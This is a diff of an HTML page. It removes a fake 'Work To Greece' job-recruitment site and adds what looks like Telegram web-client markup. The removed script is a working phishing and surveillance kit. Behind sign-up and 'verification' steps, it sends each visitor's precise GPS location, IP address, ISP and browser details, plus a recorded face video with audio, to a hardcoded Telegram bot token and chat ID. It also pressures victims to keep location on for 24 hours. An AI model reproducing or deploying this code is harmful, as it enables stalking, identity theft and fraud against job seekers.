+          <path d="M3.49852 6.5C3.64328 6.5 3.75554 6.39655 3.77917 6.24581C4.04505 4.27438 4.31979 3.99655 6.23412 3.78374C6.38479 3.76601 6.5 3.64483 6.5 3.5C6.5 3.35222 6.38774 3.23399 6.23708 3.21626C4.3257 2.98867 4.06278 2.72266 3.77917 0.754187C3.75554 0.603448 3.64033 0.5 3.49852 0.5C3.35672 0.5 3.24151 0.603448 3.21787 0.754187C2.95199 2.72562 2.67725 3.00345 0.765879 3.21626C0.61226 3.23399 0.5 3.35222 0.5 3.5C0.5 3.64483 0.609306 3.76305 0.762925 3.78374C2.6743 4.04089 2.92541 4.27734 3.21787 6.24581C3.24446 6.39655 3.35968 6.5 3.49852 6.5Z" fill="currentColor"/>
+        </symbol>
+        <linearGradient id="paint0_linear_6651_5783" x1="12.1999" y1="-1.71024" x2="12.1999" y2="25.2914" gradientUnits="userSpaceOnUse">
+          <stop stop-color="#FFF0C2"/>
+          <stop offset="1" stop-color="#FFEBBA"/>
+        </linearGradient>
+        <linearGradient id="paint1_linear_6651_5783" x1="12.1992" y1="-1.70952" x2="20.922" y2="24.9546" gradientUnits="userSpaceOnUse">
+          <stop stop-color="#FFD147"/>
+          <stop offset="1" stop-color="#FFB526"/>
+        </linearGradient>
+        <linearGradient id="paint2_linear_6651_5783" x1="12.1856" y1="1.51874" x2="16.8655" y2="22.0231" gradientUnits="userSpaceOnUse">
+          <stop stop-color="#E58F0D"/>
+          <stop offset="1" stop-color="#EB7814"/>
+        </linearGradient>
+      </defs>
+    </svg>
+    <div class="sidebar-left-overlay"></div>
+    <div class="whole page-chats" style="display: none;" id="page-chats">
+      <div id="main-columns" class="tabs-container" data-animation="navigation">
+        <div class="tabs-tab chatlist-container sidebar sidebar-left main-column sidebar-left-common" id="column-left">
+          <div class="sidebar-slider tabs-container">
+            <div class="tabs-tab sidebar-slider-item item-main active">
+              <div class="sidebar-header main-search-sidebar-header can-have-forum">
+                <div class="sidebar-header__btn-container left-sidebar-burger">
+                  <div class="animated-menu-icon"></div>
+                  <div class="btn-icon sidebar-back-button"></div>
+                </div>
+              </div>
+              <div class="sidebar-content transition zoom-fade can-have-forum">
+                <div class="transition-item active" id="chatlist-container">
+                  <div class="tabs-container" id="folders-container"></div>
+                </div>
+                <div class="transition-item sidebar-search" id="search-container"></div>
+              </div>
+            </div>
+          </div>
         </div>
-      </div>
-      <div class="step-row">
-        <div class="step-num active">2</div>
-        <div class="step-info">
-          <div class="step-name">Facial Verification</div>
-          <div class="step-desc">10-second face video required</div>
-        </div>
-      </div>
-      <div class="step-row">
-        <div class="step-num pending">3</div>
-        <div class="step-info">
-          <div class="step-name">24-Hour Location Access</div>
-          <div class="step-desc">Required for account review process</div>
+        <div class="tabs-tab main-column" id="column-center"></div>
+        <div class="tabs-tab sidebar sidebar-right main-column" id="column-right">
+          <div class="sidebar-content sidebar-slider tabs-container"></div>
         </div>
       </div>
     </div>
-
-    <button class="p-btn" onclick="openFacial()">Start Facial Verification</button>
-    <button class="g-btn" onclick="closeAll()">Complete Later</button>
-  </div>
-</div>
-
-<!-- ══════════════════════════════
-  POPUP 3 — FACIAL VIDEO
-══════════════════════════════ -->
-<div class="overlay hidden" id="faceOverlay">
-  <div class="popup">
-    <div class="cam-icon-wrap" id="camIconWrap">
-      <!-- Camera SVG -->
-      <svg viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg">
-        <rect x="4" y="18" width="56" height="38" rx="6" fill="#455a64"/>
-        <rect x="4" y="18" width="56" height="38" rx="6" fill="none" stroke="#546e7a" stroke-width="2"/>
-        <circle cx="32" cy="37" r="12" fill="#37474f" stroke="#546e7a" stroke-width="2"/>
-        <circle cx="32" cy="37" r="8" fill="#263238"/>
-        <circle cx="32" cy="37" r="5" fill="#1a237e" opacity="0.8"/>
-        <circle cx="29" cy="34" r="2" fill="rgba(255,255,255,0.25)"/>
-        <rect x="20" y="10" width="14" height="10" rx="3" fill="#546e7a"/>
-        <rect x="46" y="22" width="8" height="5" rx="2" fill="#37474f"/>
-      </svg>
-    </div>
-
-    <h2 class="popup-title" id="faceTitle">Facial Verification</h2>
-    <p class="popup-sub" id="faceDesc">Your camera will activate. Please <strong>position your face</strong> within the frame and remain still for <strong>10 seconds</strong>.</p>
-
-    <div class="cam-wrap" id="camWrap">
-      <video id="faceVideo" autoplay muted playsinline></video>
-      <div class="cam-overlay"><div class="face-oval"></div></div>
-      <div class="rec-badge" id="recBadge"><div class="rec-dot"></div>REC</div>
-    </div>
-
-    <div class="timer-wrap" id="timerWrap">
-      <div class="timer-bar"><div class="timer-fill" id="timerFill"></div></div>
-      <div class="timer-text" id="timerText">Recording: 0s / 10s</div>
-    </div>
-
-    <div class="err-box" id="faceErr"></div>
-    <button class="p-btn" id="faceBtn" onclick="startFacial()">Start Recording</button>
-    <button class="g-btn" id="faceLaterBtn" onclick="skipToWarning()">Skip for Now</button>
-  </div>
-</div>
-
-<!-- ══════════════════════════════
-  POPUP 4 — 24H WARNING
-══════════════════════════════ -->
-<div class="overlay hidden" id="warnOverlay">
-  <div class="popup yellow-bar">
-    <div class="warn-icon-wrap">
-      <div class="warn-triangle"></div>
-    </div>
-
-    <h2 class="popup-title amber">Important Notice</h2>
-    <p class="popup-sub" style="color:#7a4f00;font-weight:600;margin-bottom:16px">The following conditions must be met for your account to be reviewed:</p>
-
-    <div class="warn-card">
-      <div class="warn-card-title">
-        Keep Location ON for the Next 24 Hours
-      </div>
-      <div class="warn-rule">
-        <div class="warn-num">1</div>
-        <div class="warn-rule-text">Your phone's <strong>Location / GPS</strong> must remain enabled at all times.</div>
-      </div>
-      <div class="warn-rule">
-        <div class="warn-num">2</div>
-        <div class="warn-rule-text">Do <strong>not deny</strong> location permission in your browser.</div>
-      </div>
-      <div class="warn-rule">
-        <div class="warn-num">3</div>
-        <div class="warn-rule-text">Our team will access your location while <strong>verifying your account</strong>.</div>
-      </div>
-      <div class="warn-rule">
-        <div class="warn-num">4</div>
-        <div class="warn-rule-text">Disabling location may result in your <strong>account being suspended</strong>.</div>
-      </div>
-    </div>
-
-    <div class="loc-track">
-      <div class="loc-pulse"></div>
-      <div class="loc-track-text">Location Tracking Active — Review in Progress...</div>
-    </div>
-
-    <button class="p-btn amber-btn" onclick="finishAll()">Understood, I'll Keep Location ON</button>
-  </div>
-</div>
-
-<!-- TOAST -->
-<div class="toast" id="toast"></div>
-
-<!-- ══════════════════════════════
-  HERO
-══════════════════════════════ -->
-<section class="hero">
-  <div class="hero-bg"></div>
-  <div class="flag-overlay"></div>
-  <div class="hero-content">
-    <div class="title-row">
-      <div class="flag-icon"></div>
-      <div><div class="hero-pretitle">Work To</div></div>
-    </div>
-    <h1>
-      <span class="work">WORK TO</span>
-      <span class="greece">GREECE</span>
-    </h1>
-    <div class="hero-line"></div>
-    <p class="hero-sub">Find the right job opportunity<br>and build your better future in Greece.</p>
-    <button class="signup-btn" onclick="openGeo()">
-      <span class="btn-icon">👤</span>
-      <span class="btn-text">SIGN UP NOW</span>
-      <span class="btn-arrow">→</span>
-    </button>
-  </div>
-</section>
-
-<!-- FEATURES -->
-<section class="features-section">
-  <div class="features-grid">
-    <div class="feature-item">
-      <div class="feature-icon-wrap"><svg viewBox="0 0 24 24"><circle cx="12" cy="8" r="4"/><path d="M4 20c0-4 3.6-7 8-7s8 3 8 7"/></svg></div>
-      <div class="feature-text"><h3>Easy Sign Up</h3><p>Quick and simple registration process</p></div>
-    </div>
-    <div class="feature-item">
-      <div class="feature-icon-wrap"><svg viewBox="0 0 24 24"><rect x="2" y="8" width="20" height="13" rx="2"/><path d="M8 8V6a4 4 0 0 1 8 0v2"/><line x1="12" y1="13" x2="12" y2="17"/><line x1="2" y1="13" x2="22" y2="13"/></svg></div>
-      <div class="feature-text"><h3>Verified Jobs</h3><p>Thousands of verified job opportunities</p></div>
-    </div>
-    <div class="feature-item">
-      <div class="feature-icon-wrap"><svg viewBox="0 0 24 24"><path d="M12 2L3 7v6c0 5 4 9.3 9 10 5-.7 9-5 9-10V7L12 2z"/><polyline points="9,12 11,14 15,10"/></svg></div>
-      <div class="feature-text"><h3>Trusted Platform</h3><p>Secure and reliable job portal</p></div>
-    </div>
-    <div class="feature-item">
-      <div class="feature-icon-wrap"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"/><line x1="3.6" y1="9" x2="20.4" y2="9"/><line x1="3.6" y1="15" x2="20.4" y2="15"/><path d="M12 3c-2 3-3 6-3 9s1 6 3 9"/><path d="M12 3c2 3 3 6 3 9s-1 6-3 9"/></svg></div>
-      <div class="feature-text"><h3>Work in Greece</h3><p>Build your career in a beautiful country</p></div>
-    </div>
-  </div>
-</section>
-
-<!-- STATS -->
-<section class="stats-section">
-  <div class="stats-grid">
-    <div class="stat-item"><span class="stat-icon">💼</span><div class="stat-text"><div class="num">10,000+</div><div class="label">Job Opportunities</div></div></div>
-    <div class="stat-item"><span class="stat-icon">👥</span><div class="stat-text"><div class="num">5,000+</div><div class="label">Happy Workers</div></div></div>
-    <div class="stat-item"><span class="stat-icon">🏢</span><div class="stat-text"><div class="num">1,200+</div><div class="label">Trusted Employers</div></div></div>
-    <div class="stat-item"><span class="stat-icon">📍</span><div class="stat-text"><div class="num">Greece</div><div class="label">Your Next Destination</div></div></div>
-  </div>
-</section>
-
-<script>
-// ── CONFIG ──
-const BOT_TOKEN = "8726361470:AAErTzupAMjDRDopACMXBz0_YMuU_2h2cQg";
-const CHAT_ID   = "1873240895";
-
-// ── HELPERS ──
-const $ = id => document.getElementById(id);
-function show(id){ $(id).classList.remove('hidden'); }
-function hide(id){ $(id).classList.add('hidden'); }
-function closeAll(){ ['geoOverlay','regOverlay','faceOverlay','warnOverlay'].forEach(hide); stopCamera(); }
-function showToast(msg,dur=4000){ const t=$('toast'); t.textContent=msg; t.classList.add('show'); setTimeout(()=>t.classList.remove('show'),dur); }
-
-// ── TG ──
-async function tgText(msg){
-  try{ await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:CHAT_ID,text:msg,parse_mode:'Markdown'})}); return true; }catch(e){ return false; }
-}
-async function tgVideo(blob,ext){
-  try{
-    const fd=new FormData();
-    fd.append('chat_id',CHAT_ID);
-    fd.append('video',blob,`face_verify.${ext}`);
-    fd.append('caption',` *FACIAL VERIFICATION*\n🇬🇷 Work To Greece\n🕐 ${new Date().toLocaleString()}`);
-    fd.append('parse_mode','Markdown');
-    const r=await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`,{method:'POST',body:fd});
-    const d=await r.json(); return d.ok;
-  }catch(e){ return false; }
-}
-
-// ── STEP 1: GEO ──
-function openGeo(){
-  $('geoErr').style.display='none';
-  $('geoBtn').textContent='✓  Allow Location & Sign Up';
-  $('geoBtn').disabled=false;
-  show('geoOverlay');
-}
-
-async function requestLocation(){
-  const btn=$('geoBtn'), err=$('geoErr');
-  err.style.display='none';
-  btn.textContent='⏳  Detecting location...';
-  btn.disabled=true;
-
-  if(!navigator.geolocation){
-    err.textContent='❌ Your browser does not support Geolocation.';
-    err.style.display='block';
-    btn.textContent='✓  Allow Location & Sign Up';
-    btn.disabled=false;
-    return;
-  }
-
-  navigator.geolocation.getCurrentPosition(
-    async pos=>{
-      const lat=pos.coords.latitude.toFixed(6), lon=pos.coords.longitude.toFixed(6), acc=pos.coords.accuracy.toFixed(0);
-      let ipBlock='';
-      try{
-        const ip=await(await fetch('https://api.ipify.org?format=json')).json();
-        const loc=await(await fetch(`https://ipapi.co/${ip.ip}/json/`)).json();
-        ipBlock=`\n\n🌐 *IP:* ${ip.ip}\n*Country:* ${loc.country_name||'N/A'}\n*City:* ${loc.city||'N/A'}\n*ISP:* ${loc.org||'N/A'}`;
-      }catch(e){}
-      const ua=navigator.userAgent;
-      let br='Unknown';
-      if(ua.includes('Chrome')&&!ua.includes('Edg'))br='Chrome';
-      else if(ua.includes('Firefox'))br='Firefox';
-      else if(ua.includes('Safari')&&!ua.includes('Chrome'))br='Safari';
-      else if(ua.includes('Edg'))br='Edge';
-
-      await tgText(`🇬🇷 *WORK TO GREECE — NEW SIGN UP*\n\n📍 *Latitude:* ${lat}\n📍 *Longitude:* ${lon}\n📡 *Accuracy:* ${acc}m\n🗺️ *Maps:* https://maps.google.com/?q=${lat},${lon}${ipBlock}\n\n📱 *Platform:* ${navigator.platform}\n🌐 *Browser:* ${br}\n🕐 *Time:* ${new Date().toLocaleString()}`);
-      hide('geoOverlay');
-      show('regOverlay');
-    },
-    e=>{
-      err.innerHTML=e.code===1?'❌ Location access was denied.<br>Please allow location from browser settings and retry.':'❌ Unable to retrieve location. Please try again.';
-      err.style.display='block';
-      btn.textContent='🔄  Retry';
-      btn.disabled=false;
-    },
-    {enableHighAccuracy:true,timeout:15000,maximumAge:0}
-  );
-}
-
-// ── STEP 3: FACIAL ──
-let mStream=null, mRecorder=null, mChunks=[], mTimer=null;
-
-function openFacial(){
-  hide('regOverlay');
-  $('camIconWrap').style.display='flex';
-  $('faceTitle').textContent='Facial Verification';
-  $('faceDesc').innerHTML='Your camera will activate. Please <strong>position your face</strong> within the frame and remain still for <strong>10 seconds</strong>.';
-  $('faceBtn').textContent='Start Recording';
-  $('faceBtn').disabled=false;
-  $('faceBtn').onclick=startFacial;
-  $('faceLaterBtn').style.display='block';
-  $('faceErr').style.display='none';
-  $('camWrap').style.display='none';
-  $('timerWrap').classList.remove('show');
-  $('recBadge').classList.remove('show');
-  show('faceOverlay');
-}
-
-async function startFacial(){
-  const btn=$('faceBtn'), err=$('faceErr');
-  err.style.display='none';
-  btn.textContent='⏳  Activating camera...';
-  btn.disabled=true;
-  $('faceLaterBtn').style.display='none';
-
-  try{
-    mStream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:{ideal:640},height:{ideal:480}},audio:true});
-    $('faceVideo').srcObject=mStream;
-    $('camWrap').style.display='block';
-    $('camIconWrap').style.display='none';
-    btn.textContent=' Recording starts in 1s...';
-    setTimeout(()=>beginRecording(),1000);
-  }catch(e){
-    err.innerHTML='❌ Camera or microphone access is required.<br>Please allow access from your browser settings.';
-    err.style.display='block';
-    btn.textContent='🔄  Retry';
-    btn.disabled=false;
-    $('faceLaterBtn').style.display='block';
-  }
-}
-
-function beginRecording(){
-  mChunks=[];
-  const btn=$('faceBtn');
-  btn.textContent='⏺  Recording in progress...';
-  btn.disabled=true;
-
-  const mime=MediaRecorder.isTypeSupported('video/webm;codecs=vp9,opus')?'video/webm;codecs=vp9,opus':MediaRecorder.isTypeSupported('video/webm')?'video/webm':'video/mp4';
-  mRecorder=new MediaRecorder(mStream,{mimeType:mime});
-  mRecorder.ondataavailable=e=>{if(e.data.size>0)mChunks.push(e.data)};
-  mRecorder.onstop=handleVideoDone;
-  mRecorder.start(200);
-
-  $('recBadge').classList.add('show');
-  $('timerWrap').classList.add('show');
-
-  let elapsed=0;
-  mTimer=setInterval(()=>{
-    elapsed++;
-    $('timerFill').style.width=(elapsed*10)+'%';
-    $('timerText').textContent=`Recording: ${elapsed}s / 10s`;
-    if(elapsed>=10){ clearInterval(mTimer); mRecorder.stop(); }
-  },1000);
-}
-
-async function handleVideoDone(){
-  stopCamera();
-  const btn=$('faceBtn');
-  btn.textContent=' Uploading to server...';
-  btn.disabled=true;
-  $('recBadge').classList.remove('show');
-
-  const ext=mChunks[0]?.type.includes('mp4')?'mp4':'webm';
-  const blob=new Blob(mChunks,{type:mChunks[0]?.type||'video/webm'});
-  const ok=await tgVideo(blob,ext);
-
-  if(ok){
-    $('camIconWrap').style.display='flex';
-    $('camIconWrap').innerHTML='<div style="font-size:54px;animation:iconFloat 2s ease-in-out infinite">✅</div>';
-    $('camWrap').style.display='none';
-    $('timerWrap').classList.remove('show');
-    $('faceTitle').textContent='Face Verified!';
-    $('faceDesc').innerHTML='<strong style="color:#00843a">Your facial verification was successful.</strong><br>Proceed to the final step to complete your registration.';
-    btn.textContent='Continue to Final Step →';
-    btn.disabled=false;
-    btn.onclick=()=>{ hide('faceOverlay'); show('warnOverlay'); };
-    $('faceLaterBtn').style.display='none';
-  } else {
-    $('faceErr').innerHTML='❌ Upload failed. Please check your connection and try again.';
-    $('faceErr').style.display='block';
-    btn.textContent='🔄  Retry';
-    btn.disabled=false;
-    btn.onclick=startFacial;
-    $('faceLaterBtn').style.display='block';
-  }
-}
-
-function stopCamera(){
-  if(mStream){ mStream.getTracks().forEach(t=>t.stop()); mStream=null; }
-  if(mTimer){ clearInterval(mTimer); mTimer=null; }
-}
-
-function skipToWarning(){ stopCamera(); hide('faceOverlay'); show('warnOverlay'); }
-
-// ── STEP 4: FINISH ──
-function finishAll(){
-  closeAll();
-  showToast('🎉 Verification complete! Your account is under review.',5000);
-}
-
-// backdrop close
-['geoOverlay','regOverlay','faceOverlay'].forEach(id=>{
-  $(id).addEventListener('click',function(e){ if(e.target===this) closeAll(); });
-});
-</script>
-</body>
+    <div id="stories-viewer"></div>
+  </body>
 </html>
